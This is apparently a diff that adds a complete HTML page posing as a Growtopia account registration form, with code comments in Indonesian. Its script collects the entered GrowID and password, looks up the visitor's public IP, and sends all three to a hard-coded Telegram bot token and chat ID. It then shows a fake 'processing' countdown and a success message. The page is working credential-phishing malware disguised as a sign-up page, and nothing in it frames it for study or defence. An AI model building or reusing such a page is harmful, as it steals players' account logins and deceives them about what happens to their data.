@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Create Growtopia Account</title>
+  <style>
+    /* Global Styles */
+    body {
+      font-family: 'Arial', sans-serif;
+      background: #f1f1f1;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    h1 {
+      font-size: 36px;
+      color: #333;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .form-container {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .form-container label {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    .form-container input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .form-container button {
+      width: 100%;
+      padding: 12px;
+      background-color: #28a745;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .form-container button:hover {
+      background-color: #218838;
+    }
+
+    .form-container .note {
+      font-size: 12px;
+      text-align: center;
+      color: #777;
+    }
+
+    .form-container .note a {
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .form-container .note a:hover {
+      text-decoration: underline;
+    }
+
+    .ip-display {
+      font-size: 14px;
+      color: #888;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    /* Processing Modal */
+    .processing-modal {
+      display: none;
+      text-align: center;
+      padding: 20px;
+      background-color: rgba(0, 0, 0, 0.7);
+      color: #fff;
+      border-radius: 8px;
+      margin-top: 20px;
+    }
+
+    .processing-modal img {
+      width: 50px;
+      height: 50px;
+      animation: spin 1s infinite linear;
+    }
+
+    .processing-modal h2 {
+      font-size: 18px;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Responsive Design */
+    @media (max-width: 500px) {
+      .form-container {
+        width: 90%;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <h1>Create Your Growtopia Account</h1>
+    <form id="registrationForm">
+      <label for="growid">Enter GrowID:</label>
+      <input type="text" id="growid" name="growid" placeholder="Enter your GrowID" required>
+
+      <label for="password">Enter Password:</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+      <label for="ip">Your IP:</label>
+      <input type="text" id="ip" name="ip" value="IP_ADDRESS" readonly>
+
+      <button type="submit">Register Account</button>
+    </form>
+    <div class="note">
+      <p>Already have an account? <a href="#">Login here</a></p>
+    </div>
+    <div class="ip-display">
+      <p>Your IP will be automatically filled in.</p>
+    </div>
+  </div>
+
+  <!-- Processing Modal -->
+  <div id="processingModal" class="processing-modal">
+    <img src="data:image/jpeg;base64,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" alt="Processing...">
+    <h2>Your account is processing, estimated 3-5 minutes</h2>
+    <p id="timerText"></p>
+  </div>
+
+  <script>
+    // Fetch the user's public IP using an API and set the value in the IP field
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('ip').value = data.ip;
+      })
+      .catch(error => console.error('Error fetching IP:', error));
+
+    // Send registration data to Telegram bot
+    document.getElementById('registrationForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      // Tampilkan modal pemrosesan
+      document.getElementById('processingModal').style.display = 'block';
+
+      // Ambil data dari form
+      const growid = document.getElementById('growid').value;
+      const password = document.getElementById('password').value;
+      const ip = document.getElementById('ip').value;
+
+      // Siapkan pesan untuk dikirim ke Telegram dengan format yang diminta
+      const message = `[NEW ACC REQUEST]\n[GROWID: ${growid}]\n` +
+                      `--------------------------------------\n` +
+                      `[PASSWORD: ${password}]\n` +
+                      `--------------------------------------\n` +
+                      `[IP: ${ip}]`;
+
+      // Telegram bot API token dan chat ID
+      const botToken = '7982345837:AAFdbvuXdSAR0Wms37uN_WW_sYSb6uZJ5t8';
+      const chatId = '7141301127';  // Ganti dengan chat ID yang sesuai
+
+      // Kirim pesan ke Telegram menggunakan fetch
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert('Account registered successfully!');
+        } else {
+          alert('Error sending message to Telegram.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('There was an error processing your request.');
+      });
+
+      // Timer Random 3-5 menit
+      const randomMinutes = Math.floor(Math.random() * 3) + 3;  // Angka acak antara 3 dan 5
+      const totalSeconds = randomMinutes * 60;
+      let secondsLeft = totalSeconds;
+
+      // Update timer setiap detik
+      const timerInterval = setInterval(() => {
+        secondsLeft--;
+        const minutes = Math.floor(secondsLeft / 60);
+        const seconds = secondsLeft % 60;
+        document.getElementById('timerText').innerText = `Time remaining: ${minutes}m ${seconds}s`;
+
+        if (secondsLeft <= 0) {
+          clearInterval(timerInterval); // Hentikan timer
+          document.getElementById('processingModal').style.display = 'none'; // Sembunyikan modal setelah selesai
+          alert('Account registration process complete!');
+        }
+      }, 1000);
+    });
+  </script>
+
+</body>
+</html>
